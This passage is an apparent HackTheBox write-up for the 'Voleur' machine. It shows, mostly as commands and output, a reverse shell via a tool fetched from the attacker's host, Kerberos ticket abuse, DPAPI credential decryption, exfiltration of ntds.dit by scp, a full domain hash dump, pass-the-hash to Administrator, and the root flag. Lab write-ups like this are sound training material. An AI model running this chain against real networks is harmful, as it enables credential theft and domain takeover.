Location: https://release-assets.githubusercontent.com/github-production-release-asset/201331135/46cefc59-1a1e-4e32-8b47-864a11159984?sp=r&sv=2018-11-09&sr=b&spr=https&se=2025-10-06T09%3A10%3A58Z&rscd=attachment%3B+filename%3DRunasCs.zip&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2025-10-06T08%3A10%3A09Z&ske=2025-10-06T09%3A10%3A58Z&sks=b&skv=2018-11-09&sig=rJH2QKwAEc4pFxsBjQoNnHl6H3vLdc4GSWrg6N%2Fgv8E%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc1OTczOTkyMiwibmJmIjoxNzU5NzM5NjIyLCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.kSd9G3ELbRIx0J70vkzgOuOJ4sqSAYWn23Do4UGYTHA&response-content-disposition=attachment%3B%20filename%3DRunasCs.zip&response-content-type=application%2Foctet-stream [following]
--2025-10-07 00:03:46--  https://release-assets.githubusercontent.com/github-production-release-asset/201331135/46cefc59-1a1e-4e32-8b47-864a11159984?sp=r&sv=2018-11-09&sr=b&spr=https&se=2025-10-06T09%3A10%3A58Z&rscd=attachment%3B+filename%3DRunasCs.zip&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2025-10-06T08%3A10%3A09Z&ske=2025-10-06T09%3A10%3A58Z&sks=b&skv=2018-11-09&sig=rJH2QKwAEc4pFxsBjQoNnHl6H3vLdc4GSWrg6N%2Fgv8E%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc1OTczOTkyMiwibmJmIjoxNzU5NzM5NjIyLCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.kSd9G3ELbRIx0J70vkzgOuOJ4sqSAYWn23Do4UGYTHA&response-content-disposition=attachment%3B%20filename%3DRunasCs.zip&response-content-type=application%2Foctet-stream
Resolving release-assets.githubusercontent.com (release-assets.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.110.133, ...
Connecting to release-assets.githubusercontent.com (release-assets.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 39889 (39K) [application/octet-stream]
Saving to: ‘RunasCs.zip’

RunasCs.zip             100%[============================>]  38.95K  --.-KB/s    in 0.006s  

2025-10-07 00:03:46 (6.81 MB/s) - ‘RunasCs.zip’ saved [39889/39889]

                                                                                             
┌──(kali㉿kali)-[~/upload]
└─$ unzip RunasCs.zip
Archive:  RunasCs.zip
  inflating: RunasCs.exe             
  inflating: RunasCs_net2.exe 

┌──(kali㉿kali)-[~/upload]
└─$ ls;python3 -m http.server 80
RunasCs.exe   RunasCs_net2.exe 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

< In another terminal >
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ nc -lvnp 4444
listening on [any] 4444 ...

< In the evil-winrm session >
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> iwr -Uri http://10.10.14.88/RunasCs.exe -OutFile RunasCs.exe

┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.88] from (UNKNOWN) [10.10.11.76] 58560
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
voleur\svc_ldap
```

Nice, now we can try to restore the user <code>todd.wolfe</code> and generate a ticket for us to access the SMB shares as the <code>Second-Line Support Technician</code>:
```
< As user svc_ldap >
PS C:\Windows\system32> Get-ADObject -Filter 'SamAccountName -eq "todd.wolfe"' -IncludeDeletedObjects | Restore-ADObject
Get-ADObject -Filter 'SamAccountName -eq "todd.wolfe"' -IncludeDeletedObjects | Restore-ADObject

< In our attacking machine >
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ python3 /opt/impacket/examples/getTGT.py voleur.htb/todd.wolfe:'NightT1meP1dg3on14' -dc-ip 10.10.11.76
Impacket v0.13.0.dev0+20250808.170117.00f43cf7 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in todd.wolfe.ccache
                                                                                             
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ export KRB5CCNAME=todd.wolfe.ccache                               
                                                                                             
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ python3 /opt/impacket/examples/smbclient.py voleur.htb/todd.wolfe@dc.voleur.htb -k -no-pass -dc-ip 10.10.11.76
Impacket v0.13.0.dev0+20250808.170117.00f43cf7 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
D# ls
drw-rw-rw-          0  Wed Jan 29 17:10:01 2025 .
drw-rw-rw-          0  Fri Jul 25 04:09:59 2025 ..
drw-rw-rw-          0  Wed Jan 29 23:13:03 2025 Second-Line Support
# cd Second-Line Support
# ls
drw-rw-rw-          0  Wed Jan 29 23:13:03 2025 .
drw-rw-rw-          0  Wed Jan 29 17:10:01 2025 ..
drw-rw-rw-          0  Wed Jan 29 23:13:06 2025 Archived Users
# cd Archived Users
# ls
drw-rw-rw-          0  Wed Jan 29 23:13:06 2025 .
drw-rw-rw-          0  Wed Jan 29 23:13:03 2025 ..
drw-rw-rw-          0  Wed Jan 29 23:13:16 2025 todd.wolfe
# cd todd.wolfe
# ls
drw-rw-rw-          0  Wed Jan 29 23:13:16 2025 .
drw-rw-rw-          0  Wed Jan 29 23:13:06 2025 ..
drw-rw-rw-          0  Wed Jan 29 23:13:06 2025 3D Objects
drw-rw-rw-          0  Wed Jan 29 23:13:09 2025 AppData
drw-rw-rw-          0  Wed Jan 29 23:13:10 2025 Contacts
drw-rw-rw-          0  Thu Jan 30 22:28:50 2025 Desktop
drw-rw-rw-          0  Wed Jan 29 23:13:10 2025 Documents
drw-rw-rw-          0  Wed Jan 29 23:13:10 2025 Downloads
drw-rw-rw-          0  Wed Jan 29 23:13:10 2025 Favorites
drw-rw-rw-          0  Wed Jan 29 23:13:10 2025 Links
drw-rw-rw-          0  Wed Jan 29 23:13:10 2025 Music
-rw-rw-rw-      65536  Wed Jan 29 23:13:06 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
-rw-rw-rw-     524288  Wed Jan 29 20:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
-rw-rw-rw-     524288  Wed Jan 29 20:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
-rw-rw-rw-         20  Wed Jan 29 20:53:07 2025 ntuser.ini
drw-rw-rw-          0  Wed Jan 29 23:13:10 2025 Pictures
drw-rw-rw-          0  Wed Jan 29 23:13:10 2025 Saved Games
drw-rw-rw-          0  Wed Jan 29 23:13:10 2025 Searches
drw-rw-rw-          0  Wed Jan 29 23:13:10 2025 Videos
#
```

From here, we found out that there is **DPAPI secrets** that can be found usually in:
```
C:\Users\$USER\AppData\Local\Microsoft\Credentials\
C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
```

We can try to [dump the DPAPI secrets](https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets) first before we can try to crack it:
```
# cd AppData
# ls
drw-rw-rw-          0  Wed Jan 29 23:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 23:13:16 2025 ..
drw-rw-rw-          0  Wed Jan 29 23:13:09 2025 Local
drw-rw-rw-          0  Wed Jan 29 23:13:09 2025 LocalLow
drw-rw-rw-          0  Wed Jan 29 23:13:09 2025 Roaming
# cd Local/Microsoft/Credentials
# ls
drw-rw-rw-          0  Wed Jan 29 23:13:06 2025 .
drw-rw-rw-          0  Wed Jan 29 23:13:07 2025 ..
-rw-rw-rw-      11068  Wed Jan 29 21:06:56 2025 DFBE70A7E5CC19A398EBF1B96859CE5D
# get DFBE70A7E5CC19A398EBF1B96859CE5D
# cd ../../../Roaming/Microsoft/Credentials
# ls
drw-rw-rw-          0  Wed Jan 29 23:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 23:13:09 2025 ..
-rw-rw-rw-        398  Wed Jan 29 21:13:50 2025 772275FAD58525253490A9B0039791D3
# get 772275FAD58525253490A9B0039791D3
# cd ../Protect
# ls
drw-rw-rw-          0  Wed Jan 29 23:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 23:13:09 2025 ..
-rw-rw-rw-         24  Wed Jan 29 20:53:08 2025 CREDHIST
drw-rw-rw-          0  Wed Jan 29 23:13:09 2025 S-1-5-21-3927696377-1337352550-2781715495-1110
-rw-rw-rw-         76  Wed Jan 29 20:53:08 2025 SYNCHIST
# cd S-1-5-21-3927696377-1337352550-2781715495-1110
# ls
drw-rw-rw-          0  Wed Jan 29 23:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 23:13:09 2025 ..
-rw-rw-rw-        740  Wed Jan 29 21:09:25 2025 08949382-134f-4c63-b93c-ce52efc0aa88
-rw-rw-rw-        900  Wed Jan 29 20:53:08 2025 BK-VOLEUR
-rw-rw-rw-         24  Wed Jan 29 20:53:08 2025 Preferred
# get 08949382-134f-4c63-b93c-ce52efc0aa88
```

Before we can crack the masterkey file, we need to know the SID first:
```
PS C:\> Get-ADUser -Identity todd.wolfe | Select-Object SID
Get-ADUser -Identity todd.wolfe | Select-Object SID

SID                                           
---                                           
S-1-5-21-3927696377-1337352550-2781715495-1110


PS C:\>
```

Then, we can crack the masterkey file which we had retrieved from the <code>/Protect</code> folder:
```
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ python3 /opt/impacket/examples/dpapi.py masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14 
Impacket v0.13.0.dev0+20250808.170117.00f43cf7 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83

< From Local folder >
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ python3 /opt/impacket/examples/dpapi.py credential -file DFBE70A7E5CC19A398EBF1B96859CE5D -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
Impacket v0.13.0.dev0+20250808.170117.00f43cf7 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:53:10+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000002 (CRED_PERSIST_LOCAL_MACHINE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : WindowsLive:target=virtualapp/didlogical
Description : PersistedCredential
Unknown     : 
Username    : 02xsqpzotltkxgpg
Unknown     : 
...

< From Roaming folder >
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ python3 /opt/impacket/examples/dpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83 
Impacket v0.13.0.dev0+20250808.170117.00f43cf7 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

Now, the retrieved Unknown looks like a password for the user <code>jeremy.combs</code>. We can try to verify it using the NetExec command:
```
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ nxc smb dc.voleur.htb -u jeremy.combs -p 'qT3V9pLXyN7W4m' -k --dns-server 10.10.11.76
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)                                                      
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\jeremy.combs:qT3V9pLXyN7W4m
```

Nice, now we can try to access the SMB shares again but as the <code>Third-Line Support Technician</code> user:
```
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ python3 /opt/impacket/examples/getTGT.py voleur.htb/jeremy.combs:'qT3V9pLXyN7W4m' -dc-ip 10.10.11.76
Impacket v0.13.0.dev0+20250808.170117.00f43cf7 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in jeremy.combs.ccache
                                                                                             
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ export KRB5CCNAME=jeremy.combs.ccache

┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ python3 /opt/impacket/examples/smbclient.py voleur.htb/jeremy.combs@dc.voleur.htb -k -no-pass -dc-ip 10.10.11.76
Impacket v0.13.0.dev0+20250808.170117.00f43cf7 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 17:10:01 2025 .
drw-rw-rw-          0  Fri Jul 25 04:09:59 2025 ..
drw-rw-rw-          0  Fri Jan 31 00:11:29 2025 Third-Line Support
# cd Third-Line Support
# ls
drw-rw-rw-          0  Fri Jan 31 00:11:29 2025 .
drw-rw-rw-          0  Wed Jan 29 17:10:01 2025 ..
-rw-rw-rw-       2602  Fri Jan 31 00:11:29 2025 id_rsa
-rw-rw-rw-        186  Fri Jan 31 00:07:35 2025 Note.txt.txt
# get id_rsa
# cat Note.txt.txt
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin
# 
```

Now, with the retrieved <code>id_rsa</code>, we can try to SSH to the server as the user <code>svc_backup</code> as the notes mentioned something like backup:
```
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ cp id_rsa ~/.ssh/svc_backup.id.rsa
                                                                                             
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ chmod 600 ~/.ssh/svc_backup.id.rsa

┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ ssh svc_backup@10.10.11.76 -i ~/.ssh/svc_backup.id.rsa -p 2222
Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Oct  6 09:52:10 PDT 2025

  System load:    0.52      Processes:             9
  Usage of /home: unknown   Users logged in:       0
  Memory usage:   39%       IPv4 address for eth0: 10.10.11.76
  Swap usage:     0%


363 updates can be installed immediately.
257 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Jan 30 04:26:24 2025 from 127.0.0.1
 * Starting OpenBSD Secure Shell server sshd                                          [ OK ] 
svc_backup@DC:~$
```

To ease up the process, I ran <code>linpeas</code> which showed the path for the <code>SYSTEM</code> registry file and the <code>ntds.dit</code> file. We also had full privileges here:
```
╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                                                          
  Group svc_backup:                                                                          
/mnt/c                                                                                       
/mnt/c/$Recycle.Bin
/mnt/c/$Recycle.Bin/S-1-5-21-3927696377-1337352550-2781715495-1107
/mnt/c/$Recycle.Bin/S-1-5-21-3927696377-1337352550-2781715495-1107/desktop.ini
/mnt/c/IT/Third-Line Support/Backups
/mnt/c/IT/Third-Line Support/Backups/Active Directory
/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit
/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.jfm
/mnt/c/IT/Third-Line Support/Backups/registry
/mnt/c/IT/Third-Line Support/Backups/registry/SECURITY
/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM
...

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                           
Matching Defaults entries for svc_backup on DC:                                              
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_backup may run the following commands on DC:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```

Now, just dump the <code>SYSTEM</code> file as well as the <code>ntds.dit</code> file to crack it locally:
```
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ scp -i ~/.ssh/svc_backup.id.rsa -P 2222 \
> "svc_backup@10.10.11.76:/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit" \
> /mnt/CTF/CyberSec/Learning/HackTheBox/Machines/Voleur/
ntds.dit                                                   100%   24MB   7.9MB/s   00:03    
                                                                                             
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ scp -i ~/.ssh/svc_backup.id.rsa -P 2222 \
"svc_backup@10.10.11.76:/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM" \          
/mnt/CTF/CyberSec/Learning/HackTheBox/Machines/Voleur/
SYSTEM                                                     100%   18MB   2.1MB/s   00:08    
```

Crack the registry file locally using the Impacket <code>secretsdump</code>:
```
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ python3 /opt/impacket/examples/secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
Impacket v0.13.0.dev0+20250808.170117.00f43cf7 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
Administrator:des-cbc-md5:459d836b9edcd6b0
DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
DC$:des-cbc-md5:64e05b6d1abff1c8
krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
...
[*] Cleaning up... 
```

Nice, now just create a ticket for the user <code>administrator</code> and retrieve the <code>root.txt</code>:
```
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ python3 /opt/impacket/examples/getTGT.py voleur.htb/administrator -hashes ':e656e07c56d831611b577b160b259ad2'            
Impacket v0.13.0.dev0+20250808.170117.00f43cf7 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in administrator.ccache
                                                                                             
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ export KRB5CCNAME=administrator.ccache 

┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ klist -c $KRB5CCNAME 
Ticket cache: FILE:administrator.ccache
Default principal: administrator@VOLEUR.HTB

Valid starting       Expires              Service principal
10/07/2025 01:17:41  10/07/2025 11:17:41  krbtgt/VOLEUR.HTB@VOLEUR.HTB
        renew until 10/08/2025 01:14:28

┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ evil-winrm -i dc.voleur.htb -r voleur.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                          
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                     
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
voleur\administrator
```

<details>
<summary><b>🏳️root.txt</b></summary>
<b><code>8593c8bc8d84f443b104e67c247a91d4</code></b>
</details><br>


## 📌 Final Thoughts

Thank you for reading my writeups. Based on this machine, I learned how can we restore a deleted AD users and also interacting with the services within AD networks with the NTLM authentication false option, which the server will not accept the NTLM authentication.


## 📚 References:

- NetExec - https://www.netexec.wiki/

- Abusing AD-DACL: GenericWrite - https://www.hackingarticles.in/genericwrite-active-directory-abuse/

- targetedKerberoast GitHub - https://github.com/ShutdownRepo/targetedKerberoast

- RunasCs - Csharp and open version of windows builtin runas.exe - https://github.com/antonioCoco/RunasCs

- Restore deleted AD Users - https://learn.microsoft.com/en-us/powershell/module/activedirectory/restore-adobject?view=windowsserver2025-ps

- DPAPI secrets dumping - https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets

- NTDS secrets dumping - https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds